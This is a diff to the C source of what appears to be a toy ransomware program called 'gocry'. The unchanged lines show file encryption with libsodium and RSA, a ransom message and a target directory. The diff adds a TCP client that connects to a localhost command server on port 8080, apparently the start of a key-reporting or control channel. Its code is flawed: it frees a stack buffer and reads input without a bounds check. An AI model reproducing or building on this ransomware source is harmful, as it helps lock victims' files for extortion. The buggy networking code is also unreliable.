@@ -1,4 +1,7 @@
+#include <arpa/inet.h>
 #include <dirent.h>
+#include <netdb.h>
+#include <netinet/in.h>
 #include <openssl/evp.h>
 #include <openssl/ossl_typ.h>
 #include <openssl/pem.h>
@@ -7,13 +10,17 @@
 #include <sodium/crypto_secretstream_xchacha20poly1305.h>
 #include <stdio.h>
 #include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
 
 #define CHUNK_SIZE  4096
 #define RSA_KEY_LEN 2048
+#define SERVER_PORT 8080
 
 const char *root_dir_path = "./test";
 const char *ransom_message = "You've been infected by gocry.\nAll your files are not encrypted\n";
 const char *pub_key_path = "./public.pem";
+char *UUID;
 
 static int encrypt(const char *encrypt_to, const char *source_file,
                    const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
@@ -81,6 +88,57 @@ ret:
     fclose(fp_t);
     fclose(fp_s);
     return ret;
+}
+
+int handle_socket_connection(int socketfd) {
+    char buff[1024];
+    int n;
+    for (;;) {
+        bzero(buff, sizeof(buff));
+        printf("Enter the string : ");
+        n = 0;
+        while ((buff[n++] = getchar()) != '\n')
+            ;
+        write(socketfd, buff, sizeof(buff));
+        bzero(buff, sizeof(buff));
+        read(socketfd, buff, sizeof(buff));
+        printf("From Server : %s", buff);
+        if ((strncmp(buff, "exit", 4)) == 0) {
+            break;
+        }
+    }
+    free(buff);
+
+    return 0;
+}
+
+int setup_socket_connection() {
+    int sock = 0, valread;
+    struct sockaddr_in serv_addr;
+    char *hello = "Hello from client";
+    char buffer[1024] = {0};
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        printf("\n Socket creation error \n");
+        return -1;
+    }
+
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(SERVER_PORT);
+
+    // Convert IPv4 and IPv6 addresses from text to binary form
+    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
+        printf("\nInvalid address/ Address not supported \n");
+        return -1;
+    }
+
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        printf("\nConnection Failed \n");
+        return -1;
+    }
+
+    if (handle_socket_connection(sock) != 0)
+        return 1;
+    return 0;
 }
 
 int main(void) {
